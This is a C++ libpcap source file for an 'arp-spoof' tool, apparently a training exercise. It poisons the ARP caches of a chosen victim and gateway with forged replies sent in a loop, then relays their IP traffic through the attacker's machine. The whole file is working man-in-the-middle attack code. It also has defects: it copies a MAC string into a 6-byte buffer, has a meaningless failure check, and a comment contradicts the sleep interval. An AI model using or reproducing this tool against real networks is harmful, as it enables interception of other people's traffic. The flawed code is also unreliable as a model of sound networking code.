#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"

#include <fstream>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <iostream>

#include <thread>
#include <vector>

#pragma pack(push, 1)

struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
//Define ARP Packet

struct EthIpPacket final {
	EthHdr eth_;
	IpHdr ip_;
	char *data_;
};
//Define IP Packet

#pragma pack(pop)

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

//+++++
bool get_s_mac(char* dev, char* mac){
	std::string mac_addr;
	std::ifstream mac_file("/sys/class/net/" + std::string(dev) + "/address");
	std::string str((std::istreambuf_iterator<char>(mac_file)), std::istreambuf_iterator<char>());

	if(str.length() > 0){
		strcpy(mac, str.c_str());
		return true;
	}

	return false;
}
//+++++

//+++++
bool discover_mac(pcap_t *handle, char *s_mac, char *you_ip, std::string *v_mac){
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = Mac(s_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(s_mac);
	packet.arp_.sip_ = htonl(Ip("4.4.4.4"));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(you_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
/////Send ARP

    for(int n = 0; n < 50; n++){
		struct pcap_pkthdr* header;
		const u_char* packet;

	    res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		EthHdr *ethernet = (EthHdr*) packet;
		ArpHdr *arp = (ArpHdr*) (packet + sizeof(EthHdr));

		std::string arp_r_s_ip = std::string(arp->sip());

		if((ethernet->type() == EthHdr::Arp) && (arp->op() == ArpHdr::Reply) && (arp_r_s_ip.compare(you_ip) == 0) && (arp->smac() != Mac(s_mac))){

			*v_mac = std::string(arp->smac());
			
			break;
		}

	}

	if(v_mac == NULL){
		printf("Receiving ARP failed..Try Again..");
		return false;
	}

return true;
/////Receive ARP
}
//+++++

//+++++
void infect_arp(char *dev, char *sender_ip, char *target_ip, std::string sender_mac, char *s_mac){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return;
	}
	//Define 'handle' instead of using main()'s handle. Because infect_arp() will be executed in each thread.

	while(true){
		EthArpPacket packet;

		packet.eth_.dmac_ = Mac(sender_mac);
	    packet.eth_.smac_ = Mac(s_mac);
	    packet.eth_.type_ = htons(EthHdr::Arp);

	    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	    packet.arp_.pro_ = htons(EthHdr::Ip4);
	    packet.arp_.hln_ = Mac::SIZE;
	    packet.arp_.pln_ = Ip::SIZE;
	    packet.arp_.op_ = htons(ArpHdr::Reply);
	    packet.arp_.smac_ = Mac(s_mac);
	    packet.arp_.sip_ = htonl(Ip(target_ip));
	    packet.arp_.tmac_ = Mac(sender_mac);
	    packet.arp_.tip_ = htonl(Ip(sender_ip));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		else{
			std::this_thread::sleep_for(std::chrono::milliseconds(500));
			//Infecting period -> 0.2 sec
		}

	}//End of "while"

	pcap_close(handle);
}
//+++++

//+++++
void receive_ip_and_relay(char *dev, char *sender_ip, char *target_ip, std::string sender_mac, std::string target_mac, char *s_mac){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return;
	}
	//Define 'handle' instead of using main()'s handle. Because receive_ip_and_relay() will be executed in each thread.
    
	int res;
	while(true){
		struct pcap_pkthdr* header;
		const u_char* packet;

	    res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		EthHdr *ethernet = (EthHdr*) packet;

		if(ethernet->type() == EthHdr::Ip4){
			//First, check whether 'packet' is IP or not.

			IpHdr *ip = (IpHdr*)(packet + sizeof(EthHdr));
			std::string p_source_ip = std::string(ip->sip());
			std::string p_destination_ip = std::string(ip->dip());

			if(p_source_ip.compare(sender_ip) == 0){
				//Second, check whether the IP is from sender.
				printf("\nSuccessfully received sender's IP!\n");

				ethernet->smac_ = Mac(s_mac);
				ethernet->dmac_ = Mac(target_mac);

				res = pcap_sendpacket(handle, packet, header->caplen);
				
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}
				else{
					printf("Successfully relay sender's IP!\n");
			    }

			}//End of 2nd "if"
			else if(p_destination_ip.compare(sender_ip) == 0){
				//Third, check whether the IP is from target.
				printf("\nSuccessfully received target's IP!\n");

		        ethernet->smac_ = Mac(s_mac);
				ethernet->dmac_ = Mac(sender_mac);

				res = pcap_sendpacket(handle, packet, header->caplen);
				
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}
				else{
					printf("Successfully relay target's IP!\n");
			    }

			}//End of "else if"
			else{
				continue;
			}

		}//End of 1st "if"
		else{
			continue;
		}

	}//End of "while"

	pcap_close(handle);
}
//+++++

int main(int argc, char* argv[]) {
	if (argc <= 3 || argc%2 == 1) {
		usage();
		return -1;
	}

	int count = (argc - 2)/2;

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	/////
	char s_mac[Mac::SIZE];
	if(get_s_mac(dev, s_mac)){
		printf("My MAC address = %s\n", s_mac);
	}
	else{
		printf("Couldn't get my MAC address\n");
		return -1;
	}
	/////
	
	std::vector<std::thread> fingers;
	//Define thread which name is "fingers"

	for(int i=0; i<count; i++){
		char *you_ip = argv[2+(2*i)];
		char *gate_ip = argv[3+(2*i)];
		std::string sender_mac;
		std::string target_mac;

		discover_mac(handle, s_mac, you_ip, &sender_mac);
		printf("Sender_%d's MAC = %s\n", i+1, sender_mac.c_str());

		discover_mac(handle, s_mac, gate_ip, &target_mac);
		printf("Target_%d's MAC = %s\n\n", i+1, target_mac.c_str());

		fingers.push_back(std::thread(infect_arp, dev, you_ip, gate_ip, sender_mac, s_mac));
		//sender flow
		fingers.push_back(std::thread(infect_arp, dev, gate_ip, you_ip, target_mac, s_mac));
		//target flow
		fingers.push_back(std::thread(receive_ip_and_relay, dev, you_ip, gate_ip, sender_mac, target_mac, s_mac));

	}
	//End of "for"

	pcap_close(handle);

	for(auto& t : fingers){
		t.join();
	}
	//Join all threads to store multi-threads.

}